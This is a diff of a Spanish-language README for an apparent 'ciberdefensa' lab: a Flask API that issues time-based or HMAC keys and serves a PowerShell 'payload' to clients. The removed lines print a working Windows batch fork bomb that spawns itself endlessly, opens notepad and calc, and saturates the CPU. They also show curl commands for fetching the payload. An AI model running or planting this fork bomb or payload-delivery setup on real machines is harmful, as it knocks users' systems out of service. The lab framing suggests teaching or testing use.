@@ -1,146 +1,61 @@
-# ⚙️ Ciberdefensa API — Lab Distribución + Test
+# 🔥 API v5.0 - Stateless HMAC Payload Server
 
-## 📌 Descripción
+API ligera construida con Flask que implementa un mecanismo de
+autenticación stateless basado en HMAC, diseñada para servir artefactos
+(payloads) de forma controlada sin necesidad de sesiones persistentes.
 
-Este proyecto implementa un entorno de laboratorio completo para:
+## 🧠 Arquitectura
 
-- Generación de claves temporales basadas en tiempo
-- Validación de acceso a endpoints
-- Distribución de artefactos vía HTTP
-- Ejecución de carga en cliente
-- Verificación automática del flujo end-to-end
+El flujo es simple y eficiente:
 
-Incluye:
+1.  Cliente solicita credenciales → /auth/key
+2.  Servidor genera:
+    -   nonce aleatorio
+    -   token = HMAC(nonce, secret)
+3.  Cliente usa ambos valores como headers para autenticarse
+4.  Si el HMAC es válido → se entrega el payload (artefacto.ps1)
 
-- API en Flask (contenedorizada)
-- Payloads en Batch
-- Script de test (`test.sh`) para validar todo el pipeline
+Sin estado. Sin base de datos. Sin sesiones.
 
----
+## ⚙️ Endpoints
 
-## 🏗️ Arquitectura
+### Health Check
 
-Cliente / test.sh → API Flask → Payload
+GET /health
 
----
+### Generación de Token
 
-## 🧱 Componentes
+GET /auth/key
 
-### API (`api_server.py`)
-- Genera MASTER_KEY persistente
-- Genera claves temporales
-- Entrega payload
-- Expone endpoints
+### Descarga de Payload
 
-### Docker
-- python:3.11-alpine
-- gunicorn (1 worker)
-- puerto 8080 expuesto
+GET /payload/encrypted
 
-### Volumen
-- ./data → /data (keys.txt)
+Headers: X-Nonce: `<nonce>`{=html} X-Token: `<token>`{=html}
 
-### Payloads
-- artefacto.ps1 (servido por API)
-- payload.bat (uso manual)
+## 🔐 Seguridad
 
-### Test
-- test.sh automatiza flujo completo
+-   HMAC-SHA256
+-   Stateless
+-   Token truncado
 
----
-
-## 🚀 Deploy
-
-```bash
-docker-compose up -d --build
-```
-
----
-
-## 📡 Endpoints
-
-- /health → estado
-- /auth/key → genera key
-- /payload/encrypted → devuelve payload
-- /salt → debug
-
----
-
-## 🔁 Flujo
-
-```bash
-TS=$(date +%s)
-
-KEY=$(curl http://localhost:8080/auth/key?ts=$TS)
-
-curl -H "X-Decrypt-Key: $KEY"      http://localhost:8080/payload/encrypted
-```
-
----
-
-## 🔑 Lógica
-
-```
-temp = SHA256(SECRET_SALT + ts)
-key  = SHA256(MASTER_KEY + temp)
-```
-
----
-
-## 🧩 Payload
-
-```bat
-@echo off
-for /l %%i in (1,1,25) do start /b %0
-:kill
-start /b notepad
-start /b calc
-%0|%0|%0|%0
-goto kill
-```
-
-### Comportamiento
-- Multiplica procesos
-- Loop infinito
-- Satura CPU
-- Genera ruido visual
-
----
-
-## 🧪 Test
-
-```bash
-chmod +x test.sh
-./test.sh
-```
-
-Valida:
-- health
-- key
-- payload
-- contenido
-
----
+⚠️ Cambiar SECRET en producción.
 
 ## 📁 Estructura
 
-```
-.
-├── Dockerfile
-├── docker-compose.yml
-├── api_server.py
-├── artefacto.ps1
-├── payload.bat
-├── test.sh
-├── requirements.txt
-└── data/
-```
+. ├── app.py ├── artefacto.ps1 └── README.md
 
----
+## 🚀 Ejecución
 
-## 🧠 Resumen
+pip install flask python app.py
 
-Flujo:
+## 🧪 Ejemplo
 
-Cliente → key → payload → ejecución → carga
+curl http://localhost:5000/auth/key
 
+curl -H "X-Nonce: `<nonce>`{=html}" -H "X-Token: `<token>`{=html}"
+http://localhost:5000/payload/encrypted
+
+## 🧠 TL;DR
+
+HMAC + nonce = auth sin sesiones
